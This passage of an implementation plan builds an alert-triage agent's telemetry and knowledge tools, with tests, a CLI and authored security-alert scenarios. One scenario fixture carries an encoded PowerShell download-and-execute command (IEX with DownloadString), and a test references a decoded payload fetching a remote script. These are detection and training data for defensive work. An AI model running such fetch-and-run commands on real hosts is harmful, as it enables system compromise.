                result = ToolResult.fail(f"invalid arguments for '{name}': {exc.errors(include_url=False)}")
            else:
                try:
                    result = spec.fn(ctx, args)
                except Exception as exc:  # noqa: BLE001 - errors are data, never exceptions, for the agent
                    result = ToolResult.fail(f"tool '{name}' failed: {exc!r}")
        ctx.ledger.record(
            ToolCallRecord(
                seq=len(ctx.ledger.calls) + 1,
                tool=name,
                args=dict(raw_args),
                ok=result.ok,
                evidence_ids=list(result.evidence_ids),
                error=result.error,
                duration_ms=(perf_counter() - started) * 1000.0,
            )
        )
        return result
```

- [ ] Step 5: Run tests

Run: `uv run pytest tests/tools/test_registry.py -q`
Expected: 6 passed.

- [ ] Step 6: Lint and commit

```bash
uv run ruff check . && uv run mypy
git add src/alert2attack/tools/context.py src/alert2attack/tools/registry.py tests/tools
git commit -m "feat(tools): ToolResult, EvidenceLedger, ToolContext and ToolRegistry with OpenAI schemas"
```

### Task 7: Telemetry tools

Files:
- Create: `src/alert2attack/tools/telemetry.py`
- Test: `tests/tools/test_telemetry.py`

Interfaces:
- Consumes: `ToolRegistry.register`, `ToolContext`, `CaseStore` queries, `Event`, `EventKind`.
- Produces: `register_telemetry_tools(registry: ToolRegistry) -> None` registering `get_alert`, `get_process`, `get_process_tree`, `get_events_for_process`, `search_events`; helper `render_event(e: Event) -> dict[str, Any]`.

- [ ] Step 1: Write failing tests

`tests/tools/test_telemetry.py`:

```python
import pytest

from alert2attack.domain.scenario import Scenario
from alert2attack.knowledge.base import KnowledgeBase
from alert2attack.store.case_store import CaseStore
from alert2attack.tools.context import EvidenceLedger, ToolContext
from alert2attack.tools.registry import ToolRegistry
from alert2attack.tools.telemetry import register_telemetry_tools

@pytest.fixture
def ctx(downloader_scenario: Scenario) -> ToolContext:
    store = CaseStore()
    store.load_case(downloader_scenario.public())
    return ToolContext(
        store=store,
        case_id=downloader_scenario.scenario_id,
        ledger=EvidenceLedger(),
        knowledge=KnowledgeBase.load_default(),
    )

@pytest.fixture
def reg() -> ToolRegistry:
    r = ToolRegistry()
    register_telemetry_tools(r)
    return r

def test_registered_names(reg: ToolRegistry) -> None:
    assert reg.names() == [
        "get_alert",
        "get_events_for_process",
        "get_process",
        "get_process_tree",
        "search_events",
    ]

def test_get_alert_returns_trigger_and_window(reg: ToolRegistry, ctx: ToolContext) -> None:
    r = reg.call(ctx, "get_alert", {})
    assert r.ok
    assert r.data["alert"]["rule_id"] == "win_powershell_encoded_command"
    assert r.data["trigger_event"]["event_id"] == "ev-0004"
    assert r.data["window"] == {"start": "2024-03-12T09:55:00Z", "end": "2024-03-12T10:25:00Z"}
    assert r.evidence_ids == ["ev-0004"]

def test_get_process_found_and_missing(reg: ToolRegistry, ctx: ToolContext) -> None:
    r = reg.call(ctx, "get_process", {"pid": 4120})
    assert r.ok and r.data["event_id"] == "ev-0003" and r.evidence_ids == ["ev-0003"]
    assert "ts" in r.data and "user" in r.data
    miss = reg.call(ctx, "get_process", {"pid": 31337})
    assert not miss.ok and miss.error is not None and "31337" in miss.error
    assert miss.evidence_ids == []

def test_get_process_tree_ancestors_and_descendants(reg: ToolRegistry, ctx: ToolContext) -> None:
    r = reg.call(ctx, "get_process_tree", {"pid": 5288, "depth": 3})
    assert r.ok
    assert [a["pid"] for a in r.data["ancestors"]] == [4120, 3344, 1180]  # nearest first
    assert [d["pid"] for d in r.data["descendants"]] == [5304]
    assert r.data["descendants"][0]["depth"] == 1
    assert set(r.evidence_ids) == {"ev-0004", "ev-0003", "ev-0002", "ev-0001", "ev-0008"}
    assert r.truncated is False

def test_get_process_tree_depth_is_bounded(reg: ToolRegistry, ctx: ToolContext) -> None:
    r = reg.call(ctx, "get_process_tree", {"pid": 5288, "depth": 1})
    assert [a["pid"] for a in r.data["ancestors"]] == [4120]
    bad = reg.call(ctx, "get_process_tree", {"pid": 5288, "depth": 9})
    assert not bad.ok

def test_get_events_for_process_with_kind_filter(reg: ToolRegistry, ctx: ToolContext) -> None:
    r = reg.call(ctx, "get_events_for_process", {"pid": 5288})
    assert [e["event_id"] for e in r.data["events"]] == ["ev-0004", "ev-0005", "ev-0006", "ev-0007"]
    assert r.evidence_ids == ["ev-0004", "ev-0005", "ev-0006", "ev-0007"]
    reg_only = reg.call(ctx, "get_events_for_process", {"pid": 5288, "kinds": ["registry_set"]})
    assert [e["event_id"] for e in reg_only.data["events"]] == ["ev-0007"]

def test_search_events_contains_and_truncation(reg: ToolRegistry, ctx: ToolContext) -> None:
    r = reg.call(ctx, "search_events", {"contains": "185.220.101.4"})
    assert {e["event_id"] for e in r.data["events"]} == {"ev-0005", "ev-0010"}
    small = reg.call(ctx, "search_events", {"kind": "process_create", "limit": 2})
    assert len(small.data["events"]) == 2 and small.truncated is True
    assert small.data["next_offset"] == 2

def test_search_events_clamps_time_to_window(reg: ToolRegistry, ctx: ToolContext) -> None:
    r = reg.call(
        ctx,
        "search_events",
        {"since": "2020-01-01T00:00:00Z", "until": "2030-01-01T00:00:00Z", "limit": 50},
    )
    assert r.ok and len(r.data["events"]) == 12
    assert r.data["clamped_to_window"] is True
    assert r.data["since"] == "2024-03-12T09:55:00Z" and r.data["until"] == "2024-03-12T10:25:00Z"

def test_every_returned_event_is_in_ledger(reg: ToolRegistry, ctx: ToolContext) -> None:
    reg.call(ctx, "get_alert", {})
    reg.call(ctx, "get_process_tree", {"pid": 5288, "depth": 2})
    reg.call(ctx, "search_events", {"kind": "network_connect"})
    # depth 2 from 5288: parents 4120 and 3344 (not explorer 1180), child 5304; plus both connects
    assert ctx.ledger.ids() == {"ev-0002", "ev-0003", "ev-0004", "ev-0005", "ev-0008", "ev-0010"}
```

- [ ] Step 2: Run tests to verify they fail

Run: `uv run pytest tests/tools/test_telemetry.py -q`
Expected: `ImportError: cannot import name 'register_telemetry_tools'`

- [ ] Step 3: Write `src/alert2attack/tools/telemetry.py`

```python
"""Tools that read boxed telemetry. Every event they return is stamped into the ledger."""

from collections import deque
from datetime import datetime
from typing import Any

from pydantic import BaseModel, ConfigDict, Field

from alert2attack.domain.events import Event, EventKind
from alert2attack.tools.context import ToolContext, ToolResult
from alert2attack.tools.registry import ToolRegistry

MAX_TREE_NODES = 50
MAX_PAGE = 50

def render_event(e: Event) -> dict[str, Any]:
    return e.model_dump(mode="json", exclude_none=True)

def _iso_z(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%SZ")

class NoArgs(BaseModel):
    model_config = ConfigDict(extra="forbid")

class PidArgs(BaseModel):
    model_config = ConfigDict(extra="forbid")
    pid: int = Field(ge=0, description="Process id on the alert host")

class ProcessTreeArgs(PidArgs):
    depth: int = Field(default=2, ge=1, le=4, description="How many generations up and down to walk")

class ProcessEventsArgs(PidArgs):
    kinds: list[EventKind] | None = Field(
        default=None, description="Restrict to these event kinds; omit for all kinds"
    )
    limit: int = Field(default=MAX_PAGE, ge=1, le=MAX_PAGE)
    offset: int = Field(default=0, ge=0)

class SearchArgs(BaseModel):
    model_config = ConfigDict(extra="forbid")
    kind: EventKind | None = Field(default=None, description="Restrict to one event kind")
    contains: str | None = Field(
        default=None,
        min_length=2,
        max_length=200,
        description="Case-insensitive substring over image, command line, paths, registry, "
        "destination and DNS fields",
    )
    since: datetime | None = Field(default=None, description="ISO-8601 lower bound, clamped to the case window")
    until: datetime | None = Field(default=None, description="ISO-8601 upper bound, clamped to the case window")
    limit: int = Field(default=25, ge=1, le=MAX_PAGE)
    offset: int = Field(default=0, ge=0)

def register_telemetry_tools(registry: ToolRegistry) -> None:
    @registry.register(
        "get_alert",
        "Return the alert that opened this case, the event that triggered it and the time window "
        "the tools can see. Call this first.",
        NoArgs,
    )
    def get_alert(ctx: ToolContext, args: Any) -> ToolResult:
        alert = ctx.store.get_alert(ctx.case_id)
        trigger = ctx.store.get_event(ctx.case_id, alert.trigger_event_id)
        start, end = ctx.store.get_window(ctx.case_id)
        return ToolResult(
            data={
                "alert": alert.model_dump(mode="json"),
                "trigger_event": render_event(trigger) if trigger else None,
                "window": {"start": _iso_z(start), "end": _iso_z(end)},
            },
            evidence_ids=[trigger.event_id] if trigger else [],
        )

    @registry.register(
        "get_process",
        "Return the process-creation event (image, command line, parent, user, hash) for a pid "
        "on the alert host.",
        PidArgs,
    )
    def get_process(ctx: ToolContext, args: Any) -> ToolResult:
        ev = ctx.store.find_process(ctx.case_id, args.pid)
        if ev is None:
            return ToolResult.fail(
                f"no process_create event for pid {args.pid} inside the case window"
            )
        return ToolResult(data=render_event(ev), evidence_ids=[ev.event_id])

    @registry.register(
        "get_process_tree",
        "Return the ancestors (nearest first) and descendants (breadth-first, with depth) of a "
        "pid, as process-creation events.",
        ProcessTreeArgs,
    )
    def get_process_tree(ctx: ToolContext, args: Any) -> ToolResult:
        root = ctx.store.find_process(ctx.case_id, args.pid)
        if root is None:
            return ToolResult.fail(
                f"no process_create event for pid {args.pid} inside the case window"
            )
        ancestors: list[Event] = []
        current = root
        for _ in range(args.depth):
            if current.ppid is None:
                break
            parent = ctx.store.find_process(ctx.case_id, current.ppid)
            if parent is None:
                break
            ancestors.append(parent)
            current = parent

        descendants: list[tuple[Event, int]] = []
        truncated = False
        queue: deque[tuple[int, int]] = deque([(args.pid, 0)])
        while queue:
            pid, depth = queue.popleft()
            if depth >= args.depth:
                continue
            for child in ctx.store.children(ctx.case_id, pid):
                if len(descendants) >= MAX_TREE_NODES:
                    truncated = True
                    queue.clear()
                    break
                descendants.append((child, depth + 1))
                if child.pid is not None:
                    queue.append((child.pid, depth + 1))

        evidence = [root.event_id] + [a.event_id for a in ancestors] + [d.event_id for d, _ in descendants]
        return ToolResult(
            data={
                "root": render_event(root),
                "ancestors": [render_event(a) for a in ancestors],
                "descendants": [{**render_event(d), "depth": depth} for d, depth in descendants],
            },
            evidence_ids=evidence,
            truncated=truncated,
        )

    @registry.register(
        "get_events_for_process",
        "Return every event emitted by a pid (network, file, registry, DNS, process access...), "
        "optionally filtered by kind. Paginated.",
        ProcessEventsArgs,
    )
    def get_events_for_process(ctx: ToolContext, args: Any) -> ToolResult:
        events = ctx.store.query_events(
            ctx.case_id, kinds=args.kinds, pid=args.pid, limit=args.limit + 1, offset=args.offset
        )
        truncated = len(events) > args.limit
        page = events[: args.limit]
        return ToolResult(
            data={
                "pid": args.pid,
                "events": [render_event(e) for e in page],
                "next_offset": args.offset + len(page) if truncated else None,
            },
            evidence_ids=[e.event_id for e in page],
            truncated=truncated,
        )

    @registry.register(
        "search_events",
        "Search all events on the alert host inside the case window by kind, substring and time "
        "range. Use it to answer 'what else happened on this host'. Paginated.",
        SearchArgs,
    )
    def search_events(ctx: ToolContext, args: Any) -> ToolResult:
        start, end = ctx.store.get_window(ctx.case_id)
        since = max(args.since, start) if args.since else start
        until = min(args.until, end) if args.until else end
        clamped = bool((args.since and args.since < start) or (args.until and args.until > end))
        events = ctx.store.query_events(
            ctx.case_id,
            kinds=[args.kind] if args.kind else None,
            since=since,
            until=until,
            contains=args.contains,
            limit=args.limit + 1,
            offset=args.offset,
        )
        truncated = len(events) > args.limit
        page = events[: args.limit]
        return ToolResult(
            data={
                "since": _iso_z(since),
                "until": _iso_z(until),
                "clamped_to_window": clamped,
                "events": [render_event(e) for e in page],
                "next_offset": args.offset + len(page) if truncated else None,
            },
            evidence_ids=[e.event_id for e in page],
            truncated=truncated,
        )
```

- [ ] Step 4: Run tests

Run: `uv run pytest tests/tools -q`
Expected: all pass (15 tests).

- [ ] Step 5: Lint and commit

```bash
uv run ruff check . && uv run mypy
git add src/alert2attack/tools/telemetry.py tests/tools/test_telemetry.py
git commit -m "feat(tools): boxed telemetry tools (alert, process, tree, per-process events, search)"
```

### Task 8: Knowledge tools and the default registry

Files:
- Create: `src/alert2attack/tools/knowledge_tools.py`, `src/alert2attack/tools/__init__.py`
- Test: `tests/tools/test_knowledge_tools.py`

Interfaces:
- Consumes: `KnowledgeBase`, `decode_powershell`, `rule_evidence_id`, `technique_evidence_id`.
- Produces: `register_knowledge_tools(registry) -> None` registering `lookup_sigma_rule`, `lookup_attack_technique`, `decode_powershell`; `default_registry() -> ToolRegistry` with all 8 tools.

- [ ] Step 1: Write failing tests

`tests/tools/test_knowledge_tools.py`:

```python
import pytest

from alert2attack.domain.scenario import Scenario
from alert2attack.knowledge.base import KnowledgeBase
from alert2attack.store.case_store import CaseStore
from alert2attack.tools import default_registry
from alert2attack.tools.context import EvidenceLedger, ToolContext

@pytest.fixture
def ctx(downloader_scenario: Scenario) -> ToolContext:
    store = CaseStore()
    store.load_case(downloader_scenario.public())
    return ToolContext(
        store=store,
        case_id=downloader_scenario.scenario_id,
        ledger=EvidenceLedger(),
        knowledge=KnowledgeBase.load_default(),
    )

def test_default_registry_has_all_eight_tools() -> None:
    assert default_registry().names() == [
        "decode_powershell",
        "get_alert",
        "get_events_for_process",
        "get_process",
        "get_process_tree",
        "lookup_attack_technique",
        "lookup_sigma_rule",
        "search_events",
    ]

def test_lookup_sigma_rule(ctx: ToolContext) -> None:
    reg = default_registry()
    r = reg.call(ctx, "lookup_sigma_rule", {"rule_id": "win_powershell_encoded_command"})
    assert r.ok
    assert r.data["title"] == "Suspicious Encoded PowerShell Command Line"
    assert r.data["attack_technique_ids"] == ["T1059.001", "T1027"]
    assert r.evidence_ids == ["rule-win_powershell_encoded_command"]
    miss = reg.call(ctx, "lookup_sigma_rule", {"rule_id": "does_not_exist"})
    assert not miss.ok and miss.error is not None and "does_not_exist" in miss.error

def test_lookup_attack_technique(ctx: ToolContext) -> None:
    reg = default_registry()
    r = reg.call(ctx, "lookup_attack_technique", {"technique_id": "t1547.001"})
    assert r.ok and r.data["name"].startswith("Boot or Logon Autostart")
    assert r.evidence_ids == ["attack-T1547.001"]
    assert not reg.call(ctx, "lookup_attack_technique", {"technique_id": "T9999"}).ok
    assert not reg.call(ctx, "lookup_attack_technique", {"technique_id": "1547"}).ok

def test_decode_powershell_tool_is_derived_not_evidence(ctx: ToolContext) -> None:
    reg = default_registry()
    trigger = reg.call(ctx, "get_alert", {}).data["trigger_event"]
    r = reg.call(ctx, "decode_powershell", {"command_line": trigger["command_line"]})
    assert r.ok and r.data["encoded"] is True
    assert "185.220.101.4/a.ps1" in r.data["decoded"]
    assert r.evidence_ids == []
    assert ctx.ledger.ids() == {"ev-0004"}
```

- [ ] Step 2: Run tests to verify they fail

Run: `uv run pytest tests/tools/test_knowledge_tools.py -q`
Expected: `ImportError: cannot import name 'default_registry'`

- [ ] Step 3: Write `src/alert2attack/tools/knowledge_tools.py`

```python
"""Tools over the vendored knowledge base and the deterministic decoder."""

from typing import Any

from pydantic import BaseModel, ConfigDict, Field

from alert2attack.domain.evidence import rule_evidence_id, technique_evidence_id
from alert2attack.knowledge.powershell import decode_powershell as _decode
from alert2attack.tools.context import ToolContext, ToolResult
from alert2attack.tools.registry import ToolRegistry

class RuleArgs(BaseModel):
    model_config = ConfigDict(extra="forbid")
    rule_id: str = Field(
        min_length=1, description="Sigma rule slug exactly as shown in the alert's rule_id"
    )

class TechniqueArgs(BaseModel):
    model_config = ConfigDict(extra="forbid")
    technique_id: str = Field(
        pattern=r"^[Tt]\d{4}(\.\d{3})?$", description="ATT&CK technique id, e.g. T1059.001"
    )

class DecodeArgs(BaseModel):
    model_config = ConfigDict(extra="forbid")
    command_line: str = Field(min_length=1, description="Full command line to inspect")

def register_knowledge_tools(registry: ToolRegistry) -> None:
    @registry.register(
        "lookup_sigma_rule",
        "Explain the detection rule that fired: what it looks for, its ATT&CK tags and its "
        "documented false positives.",
        RuleArgs,
    )
    def lookup_sigma_rule(ctx: ToolContext, args: Any) -> ToolResult:
        rule = ctx.knowledge.rule(args.rule_id)
        if rule is None:
            return ToolResult.fail(
                f"unknown rule '{args.rule_id}'; known: {', '.join(ctx.knowledge.rule_slugs())}"
            )
        data = rule.model_dump()
        data["attack_technique_ids"] = rule.attack_technique_ids
        return ToolResult(data=data, evidence_ids=[rule_evidence_id(rule.slug)])

    @registry.register(
        "lookup_attack_technique",
        "Return the name, tactic(s) and a short description of an ATT&CK technique id.",
        TechniqueArgs,
    )
    def lookup_attack_technique(ctx: ToolContext, args: Any) -> ToolResult:
        technique = ctx.knowledge.technique(args.technique_id)
        if technique is None:
            return ToolResult.fail(f"unknown ATT&CK technique '{args.technique_id}'")
        return ToolResult(
            data=technique.model_dump(),
            evidence_ids=[technique_evidence_id(technique.technique_id)],
        )

    @registry.register(
        "decode_powershell",
        "Decode a PowerShell -EncodedCommand payload from a command line. Deterministic; the "
        "evidence remains the process event that carried the command line.",
        DecodeArgs,
    )
    def decode_powershell(ctx: ToolContext, args: Any) -> ToolResult:
        result = _decode(args.command_line)
        return ToolResult(data=result.model_dump())
```

- [ ] Step 4: Write `src/alert2attack/tools/__init__.py`

```python
from alert2attack.tools.context import EvidenceLedger, ToolCallRecord, ToolContext, ToolResult
from alert2attack.tools.knowledge_tools import register_knowledge_tools
from alert2attack.tools.registry import ToolRegistry, ToolSpec
from alert2attack.tools.telemetry import register_telemetry_tools

def default_registry() -> ToolRegistry:
    registry = ToolRegistry()
    register_telemetry_tools(registry)
    register_knowledge_tools(registry)
    return registry

__all__ = [
    "EvidenceLedger",
    "ToolCallRecord",
    "ToolContext",
    "ToolRegistry",
    "ToolResult",
    "ToolSpec",
    "default_registry",
]
```

- [ ] Step 5: Run tests

Run: `uv run pytest -q`
Expected: all pass.

- [ ] Step 6: Lint and commit

```bash
uv run ruff check . && uv run mypy
git add src/alert2attack/tools tests/tools/test_knowledge_tools.py
git commit -m "feat(tools): Sigma/ATT&CK lookup and PowerShell decode tools; default_registry"
```

### Task 9: Two more authored scenarios (benign twin, not-enough-evidence) and a dataset-wide test

Files:
- Create: `datasets/scenarios/enc_ps_sccm_benign_001/manifest.yaml`, `datasets/scenarios/enc_ps_sccm_benign_001/events.jsonl`, `datasets/scenarios/enc_ps_truncated_001/manifest.yaml`, `datasets/scenarios/enc_ps_truncated_001/events.jsonl`
- Test: `tests/datasets/__init__.py`, `tests/datasets/test_all_scenarios.py`

Interfaces:
- Consumes: `iter_scenarios`, `CaseStore`, `KnowledgeBase`, `default_registry`.
- Produces: three committed scenarios, one per gold verdict class.

- [ ] Step 1: Write the benign twin

`datasets/scenarios/enc_ps_sccm_benign_001/manifest.yaml`:

```yaml
scenario_id: enc_ps_sccm_benign_001
split: dev
origin: authored
description: >
  The same Sigma rule fires on a workstation where the SCCM client (CcmExec.exe) runs a
  software-inventory PowerShell script as SYSTEM with an encoded command. The decoded script
  writes a CSV under C:\Windows\CCM and the client talks to the internal SCCM server.
window:
  start: 2024-03-12T03:00:00Z
  end: 2024-03-12T03:30:00Z
alert:
  alert_id: alr-0002
  host: WS-ENG-22
  fired_at: 2024-03-12T03:12:05Z
  rule_id: win_powershell_encoded_command
  rule_title: Suspicious Encoded PowerShell Command Line
  severity: high
  trigger_event_id: ev-0003
gold:
  verdict: likely_benign
  techniques: []
  root_pid: 2980
  key_pids: [2980, 7712]
  persistence_evidence: []
  acceptable_actions: [close_as_benign, monitor]
  unacceptable_actions: [isolate_host, kill_process]
  narrative: >
    GOLD-MARKER-SCCM. CcmExec.exe (SCCM client, pid 2980, SYSTEM, child of services.exe)
    launched powershell.exe (pid 7712) with an encoded Get-CimInstance Win32_Product inventory
    command that exported a CSV to C:\Windows\CCM\Inventory. The only network activity is
    CcmExec to sccm01.corp.local on 443. This is the documented false-positive class of the
    rule. No persistence, no download, no untrusted binary.
```

`datasets/scenarios/enc_ps_sccm_benign_001/events.jsonl`:

```jsonl
{"event_id":"ev-0001","kind":"process_create","ts":"2024-03-12T03:01:10Z","host":"WS-ENG-22","user":"NT AUTHORITY\\SYSTEM","pid":716,"ppid":604,"image":"C:\\Windows\\System32\\services.exe","command_line":"C:\\Windows\\system32\\services.exe","parent_image":"C:\\Windows\\System32\\wininit.exe","source_event_code":1}
{"event_id":"ev-0002","kind":"process_create","ts":"2024-03-12T03:01:42Z","host":"WS-ENG-22","user":"NT AUTHORITY\\SYSTEM","pid":2980,"ppid":716,"image":"C:\\Windows\\CCM\\CcmExec.exe","command_line":"C:\\Windows\\CCM\\CcmExec.exe","parent_image":"C:\\Windows\\System32\\services.exe","source_event_code":1}
{"event_id":"ev-0003","kind":"process_create","ts":"2024-03-12T03:12:05Z","host":"WS-ENG-22","user":"NT AUTHORITY\\SYSTEM","pid":7712,"ppid":2980,"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIABXAGkAbgAzADIAXwBQAHIAbwBkAHUAYwB0ACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABOAGEAbQBlACwAVgBlAHIAcwBpAG8AbgAgAHwAIABFAHgAcABvAHIAdAAtAEMAcwB2ACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAEMAQwBNAFwASQBuAHYAZQBuAHQAbwByAHkAXABzAHcALgBjAHMAdgAgAC0ATgBvAFQAeQBwAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAA==","parent_image":"C:\\Windows\\CCM\\CcmExec.exe","parent_command_line":"C:\\Windows\\CCM\\CcmExec.exe","source_event_code":1}
{"event_id":"ev-0004","kind":"file_create","ts":"2024-03-12T03:12:09Z","host":"WS-ENG-22","user":"NT AUTHORITY\\SYSTEM","pid":7712,"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","target_path":"C:\\Windows\\CCM\\Inventory\\sw.csv","source_event_code":11}
{"event_id":"ev-0005","kind":"network_connect","ts":"2024-03-12T03:12:20Z","host":"WS-ENG-22","user":"NT AUTHORITY\\SYSTEM","pid":2980,"image":"C:\\Windows\\CCM\\CcmExec.exe","dest_ip":"10.20.0.15","dest_port":443,"dest_host":"sccm01.corp.local","source_event_code":3}
{"event_id":"ev-0006","kind":"process_create","ts":"2024-03-12T03:15:00Z","host":"WS-ENG-22","user":"NT AUTHORITY\\SYSTEM","pid":8004,"ppid":716,"image":"C:\\Windows\\System32\\svchost.exe","command_line":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s wuauserv","parent_image":"C:\\Windows\\System32\\services.exe","source_event_code":1}
```

- [ ] Step 2: Write the not-enough-evidence case

`datasets/scenarios/enc_ps_truncated_001/manifest.yaml`:

```yaml
scenario_id: enc_ps_truncated_001
split: dev
origin: authored
description: >
  A service account opens cmd.exe and launches encoded PowerShell that downloads a script from
  an internal-looking host. The window closes 30 seconds later: no child processes, no file,
  registry or network events are visible. The correct answer is to abstain and collect more.
window:
  start: 2024-03-12T10:14:00Z
  end: 2024-03-12T10:15:00Z
alert:
  alert_id: alr-0003
  host: SRV-APP-03
  fired_at: 2024-03-12T10:14:31Z
  rule_id: win_powershell_encoded_command
  rule_title: Suspicious Encoded PowerShell Command Line
  severity: high
  trigger_event_id: ev-0002
gold:
  verdict: not_enough_evidence
  techniques: [T1059.001]
  root_pid: 3120
  key_pids: [3120, 3156]
  persistence_evidence: []
  acceptable_actions: [collect_script, collect_memory, escalate, monitor]
  unacceptable_actions: [close_as_benign]
  narrative: >
    GOLD-MARKER-TRUNCATED. svc-deploy ran cmd.exe (pid 3120) from an interactive session and
    launched hidden encoded PowerShell (pid 3156) that downloads http://files.corp.local/setup.ps1.
    The hostname looks internal but is not corroborated by any DNS or network event in the
    window, and nothing after the launch is visible. Whether this is a deployment job or an
    attacker with a stolen service account cannot be decided from this data; the script and
    the process tree after 10:15 must be collected.
```

`datasets/scenarios/enc_ps_truncated_001/events.jsonl`:

```jsonl
{"event_id":"ev-0001","kind":"process_create","ts":"2024-03-12T10:14:02Z","host":"SRV-APP-03","user":"CORP\\svc-deploy","pid":3120,"ppid":2988,"image":"C:\\Windows\\System32\\cmd.exe","command_line":"\"C:\\Windows\\system32\\cmd.exe\"","parent_image":"C:\\Windows\\explorer.exe","source_event_code":1}
{"event_id":"ev-0002","kind":"process_create","ts":"2024-03-12T10:14:31Z","host":"SRV-APP-03","user":"CORP\\svc-deploy","pid":3156,"ppid":3120,"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYwBvAHIAcAAuAGwAbwBjAGEAbAAvAHMAZQB0AHUAcAAuAHAAcwAxACcAKQA=","parent_image":"C:\\Windows\\System32\\cmd.exe","parent_command_line":"\"C:\\Windows\\system32\\cmd.exe\"","source_event_code":1}
```

- [ ] Step 3: Write the dataset-wide test

`tests/datasets/__init__.py`: empty.

`tests/datasets/test_all_scenarios.py`:

```python
"""Invariants every committed scenario must satisfy. Fails loudly when someone adds a bad case."""

import pytest

from alert2attack.domain.scenario import SCENARIOS_ROOT, Scenario, iter_scenarios
from alert2attack.knowledge.base import KnowledgeBase
from alert2attack.store.case_store import CaseStore
from alert2attack.tools import default_registry
from alert2attack.tools.context import EvidenceLedger, ToolContext

SCENARIOS = list(iter_scenarios(SCENARIOS_ROOT))
KB = KnowledgeBase.load_default()

def test_one_scenario_per_gold_verdict_class_exists() -> None:
    verdicts = {s.gold.verdict for s in SCENARIOS if s.gold}
    assert verdicts == {"malicious", "likely_benign", "not_enough_evidence"}

@pytest.mark.parametrize("scenario", SCENARIOS, ids=lambda s: s.scenario_id)
def test_scenario_invariants(scenario: Scenario) -> None:
    assert scenario.gold is not None, "committed scenarios must carry gold"
    ids = {e.event_id for e in scenario.events}
    assert set(scenario.gold.persistence_evidence) <= ids
    assert KB.rule(scenario.alert.rule_id) is not None
    for t in scenario.gold.techniques:
        assert KB.technique(t) is not None, t
    pids = {e.pid for e in scenario.events if e.pid is not None}
    assert set(scenario.gold.key_pids) <= pids
    if scenario.gold.root_pid is not None:
        assert scenario.gold.root_pid in pids
    assert not (set(scenario.gold.acceptable_actions) & set(scenario.gold.unacceptable_actions))
    assert "GOLD-MARKER" in scenario.gold.narrative

@pytest.mark.parametrize("scenario", SCENARIOS, ids=lambda s: s.scenario_id)
def test_every_scenario_loads_fully_and_tools_reach_the_trigger(scenario: Scenario) -> None:
    store = CaseStore()
    report = store.load_case(scenario.public())
    assert report.loaded == len(scenario.events), "authored scenarios must be fully inside the window"
    ctx = ToolContext(store=store, case_id=scenario.scenario_id, ledger=EvidenceLedger(), knowledge=KB)
    reg = default_registry()
    alert = reg.call(ctx, "get_alert", {})
    assert alert.ok and alert.data["trigger_event"]["event_id"] == scenario.alert.trigger_event_id
    tree = reg.call(ctx, "get_process_tree", {"pid": alert.data["trigger_event"]["pid"], "depth": 4})
    assert tree.ok
    assert "GOLD-MARKER" not in store.dump_text()
```

- [ ] Step 4: Run tests

Run: `uv run pytest -q`
Expected: all pass (77 tests), including 7 dataset-parametrised tests.

- [ ] Step 5: Lint and commit

```bash
uv run ruff check . && uv run mypy
git add datasets/scenarios tests/datasets
git commit -m "data: benign SCCM twin and truncated-window scenarios; dataset invariants test"
```

### Task 10: CLI for manual investigation and README

Files:
- Create: `src/alert2attack/cli.py`, `README.md`
- Test: `tests/test_cli.py`

Interfaces:
- Consumes: `iter_scenarios`, `load_scenario`, `CaseStore`, `KnowledgeBase`, `default_registry`.
- Produces: console script `alert2attack` with `scenarios list`, `scenarios show <id>`, `tools`, `tool <name> --scenario <id> [key=value ...]`.

- [ ] Step 1: Write failing tests

`tests/test_cli.py`:

```python
import json

from typer.testing import CliRunner

from alert2attack.cli import app

runner = CliRunner()

def test_scenarios_list() -> None:
    result = runner.invoke(app, ["scenarios", "list"])
    assert result.exit_code == 0, result.output
    assert "enc_ps_downloader_001" in result.output
    assert "malicious" in result.output

def test_scenarios_show_hides_gold_by_default() -> None:
    result = runner.invoke(app, ["scenarios", "show", "enc_ps_downloader_001"])
    assert result.exit_code == 0, result.output
    assert "GOLD-MARKER" not in result.output
    assert "ev-0004" in result.output
    with_gold = runner.invoke(app, ["scenarios", "show", "enc_ps_downloader_001", "--gold"])
    assert "GOLD-MARKER" in with_gold.output

def test_tools_lists_schemas() -> None:
    result = runner.invoke(app, ["tools"])
    assert result.exit_code == 0, result.output
    assert "get_process_tree" in result.output and "depth" in result.output

def test_tool_call_prints_result_and_ledger() -> None:
    result = runner.invoke(
        app, ["tool", "get_process_tree", "--scenario", "enc_ps_downloader_001", "pid=5288", "depth=1"]
    )
    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["result"]["ok"] is True
    assert payload["result"]["data"]["ancestors"][0]["pid"] == 4120
    assert payload["ledger"] == ["ev-0003", "ev-0004", "ev-0008"]

def test_tool_call_with_bad_args_exits_nonzero() -> None:
    result = runner.invoke(app, ["tool", "get_process", "--scenario", "enc_ps_downloader_001", "pid=abc"])
    assert result.exit_code == 1
    assert "invalid arguments" in result.output

def test_unknown_scenario_exits_nonzero() -> None:
    result = runner.invoke(app, ["tool", "get_alert", "--scenario", "nope"])
    assert result.exit_code == 2
    assert "nope" in result.output
```

- [ ] Step 2: Run tests to verify they fail

Run: `uv run pytest tests/test_cli.py -q`
Expected: `ModuleNotFoundError: No module named 'alert2attack.cli'`

- [ ] Step 3: Write `src/alert2attack/cli.py`

```python
"""alert2attack command line: inspect scenarios and call tools by hand."""

import json
from pathlib import Path
from typing import Annotated, Any

import typer

from alert2attack.domain.scenario import SCENARIOS_ROOT, Scenario, iter_scenarios, load_scenario
